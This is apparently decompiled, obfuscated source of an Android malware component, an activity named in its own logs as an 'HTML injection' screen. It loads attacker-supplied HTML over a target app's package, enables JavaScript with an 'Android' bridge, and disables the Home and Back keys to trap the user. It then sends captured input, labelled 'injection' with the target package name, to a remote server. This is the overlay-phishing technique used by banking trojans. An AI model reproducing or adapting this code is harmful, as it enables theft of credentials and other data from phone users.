package com.storm.safe.rock.inject;

import android.app.Activity;
import android.os.Bundle;
import android.util.Base64;
import android.view.KeyEvent;
import android.view.ViewGroup;
import android.view.ViewParent;
import android.webkit.WebStorage;
import android.webkit.WebView;
import java.io.File;
import kotlin.coroutines.AbstractC0775a0;
import kotlin.text.AbstractC0779a1;
import kotlinx.coroutines.AbstractC0780a0;
import org.json.JSONObject;
import p000.AbstractC0577hd;
import p000.AbstractC1117qo;
import p000.AbstractC1120qr;
import p000.AbstractC1262tj;
import p000.AbstractC1517zh;
import p000.C0873ms;
import p000.ExecutorC1158qw;
import p000.jk1;
import p000.kk1;
import p000.lk1;
import p000.mk1;
import p000.t60;
import p000.y21;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class jbqfkndyx extends Activity {

    /* renamed from: a4 */
    public static final C0253a0 f51944a4 = new C0253a0(null);

    /* renamed from: a5 */
    public static boolean f51945a5;

    /* renamed from: a6 */
    public static boolean f51946a6;

    /* renamed from: a7 */
    public static volatile jbqfkndyx f51947a7;

    /* renamed from: a0 */
    public WebView f51948a0;

    /* renamed from: a1 */
    public String f51949a1 = "";

    /* renamed from: a2 */
    public final C0873ms f51950a2;

    /* renamed from: a3 */
    public final C0873ms f51951a3;

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    /* renamed from: com.storm.safe.rock.inject.jbqfkndyx$a0 */
    public static final class C0253a0 {
        public /* synthetic */ C0253a0(AbstractC1120qr abstractC1120qr) {
            this();
        }

        /* JADX INFO: Access modifiers changed from: private */
        public static final void finishCurrent$lambda$1$lambda$0(jbqfkndyx jbqfkndyxVar) {
            t60.m214695b6(jbqfkndyxVar, "$it");
            jbqfkndyxVar.finishAndRemoveTask();
        }

        /* JADX INFO: Access modifiers changed from: private */
        public static final void finishForPackage$lambda$3$lambda$2(jbqfkndyx jbqfkndyxVar) {
            t60.m214695b6(jbqfkndyxVar, "$it");
            jbqfkndyxVar.finishAndRemoveTask();
        }

        public final void finishCurrent() {
            jbqfkndyx jbqfkndyxVar = jbqfkndyx.f51947a7;
            if (jbqfkndyxVar != null) {
                jbqfkndyxVar.runOnUiThread(new jk1(jbqfkndyxVar, 1));
            }
        }

        public final void finishForPackage(String str) {
            t60.m214695b6(str, "packageName");
            jbqfkndyx jbqfkndyxVar = jbqfkndyx.f51947a7;
            if (jbqfkndyxVar == null || !t60.m214686a2(jbqfkndyxVar.f51949a1, str)) {
                return;
            }
            jbqfkndyxVar.runOnUiThread(new jk1(jbqfkndyxVar, 0));
        }

        public final boolean getActive() {
            return jbqfkndyx.f51945a5;
        }

        public final boolean getInForeground() {
            return jbqfkndyx.f51946a6;
        }

        public final void setActive(boolean z) {
            jbqfkndyx.f51945a5 = z;
        }

        public final void setInForeground(boolean z) {
            jbqfkndyx.f51946a6 = z;
        }

        private C0253a0() {
        }
    }

    public jbqfkndyx() {
        ExecutorC1158qw executorC1158qw = AbstractC1262tj.f60234a1;
        this.f51950a2 = AbstractC1117qo.m214407a0(executorC1158qw);
        this.f51951a3 = AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(executorC1158qw, new y21()));
    }

    /* renamed from: a0 */
    public static final void m211201a0(jbqfkndyx jbqfkndyxVar, String str) {
        try {
            if (str.length() == 0) {
                t60.m214726f4("jbqfkndyx", "⚠️ 数据为空，不发送");
                return;
            }
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("packageName", jbqfkndyxVar.f51949a1);
            jSONObject.put("type", "injection");
            jSONObject.put("data", str);
            jSONObject.put("timestamp", System.currentTimeMillis());
            AbstractC0780a0.m213692a3(jbqfkndyxVar.f51951a3, null, new jbqfkndyx$sendInjectionData$1(jSONObject, jbqfkndyxVar, null), 3);
        } catch (Exception e) {
            t60.m214705c6("jbqfkndyx", "❌ 发送注入数据失败", e);
        }
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        f51947a7 = this;
        String stringExtra = getIntent().getStringExtra("package_name");
        if (stringExtra == null) {
            stringExtra = "";
        }
        this.f51949a1 = stringExtra;
        String stringExtra2 = getIntent().getStringExtra("html_file");
        if (stringExtra2 == null) {
            stringExtra2 = "";
        }
        String stringExtra3 = getIntent().getStringExtra("html_content");
        String str = stringExtra3 != null ? stringExtra3 : "";
        if (str.length() == 0 && stringExtra2.length() > 0) {
            try {
                str = AbstractC1517zh.m215420f8(new File(stringExtra2));
                t60.m214714d6("jbqfkndyx", "✅ 从文件加载HTML: " + stringExtra2 + " (" + str.length() + "字节)");
            } catch (Exception e) {
                t60.m214705c6("jbqfkndyx", "❌ 读取HTML文件失败: ".concat(stringExtra2), e);
            }
        }
        if (str.length() == 0) {
            t60.m214704c5("jbqfkndyx", "❌ HTML内容为空，关闭Activity");
            finishAndRemoveTask();
            return;
        }
        try {
            WebView webView = new WebView(this);
            webView.getSettings().setJavaScriptEnabled(true);
            webView.setScrollBarStyle(0);
            webView.setWebViewClient(new lk1());
            webView.setWebChromeClient(new kk1());
            webView.addJavascriptInterface(new mk1(this, this), "Android");
            if (AbstractC0779a1.m213679d2(str, false, "data:text/html;base64,")) {
                String strSubstring = str.substring(22);
                t60.m214694b5(strSubstring, "this as java.lang.String).substring(startIndex)");
                byte[] bArrDecode = Base64.decode(strSubstring, 0);
                t60.m214694b5(bArrDecode, "decode(base64, Base64.DEFAULT)");
                str = new String(bArrDecode, AbstractC0577hd.f56650a0);
            }
            webView.loadDataWithBaseURL(null, str, "text/html", "UTF-8", null);
            this.f51948a0 = webView;
            setContentView(webView);
            f51945a5 = true;
            f51946a6 = true;
        } catch (Exception e2) {
            t60.m214705c6("jbqfkndyx", "❌ 创建HTML注入Activity失败", e2);
            finishAndRemoveTask();
        }
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        super.onDestroy();
        f51945a5 = false;
        f51946a6 = false;
        AbstractC1117qo.m214410a3(this.f51950a2);
        if (t60.m214686a2(f51947a7, this)) {
            f51947a7 = null;
        }
        try {
            WebView webView = this.f51948a0;
            if (webView != null) {
                if (webView.getParent() != null) {
                    ViewParent parent = webView.getParent();
                    ViewGroup viewGroup = parent instanceof ViewGroup ? (ViewGroup) parent : null;
                    if (viewGroup != null) {
                        viewGroup.removeView(webView);
                    }
                }
                WebStorage.getInstance().deleteAllData();
                webView.destroy();
            }
            this.f51948a0 = null;
        } catch (Exception e) {
            t60.m214705c6("jbqfkndyx", "❌ 销毁HTML注入Activity失败", e);
        }
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public final boolean onKeyDown(int i, KeyEvent keyEvent) {
        t60.m214695b6(keyEvent, "event");
        if (i == 3 || i == 4) {
            return true;
        }
        return super.onKeyDown(i, keyEvent);
    }

    @Override // android.app.Activity
    public final void onPause() {
        super.onPause();
        f51946a6 = false;
    }

    @Override // android.app.Activity
    public final void onResume() {
        super.onResume();
        f51946a6 = true;
    }
}
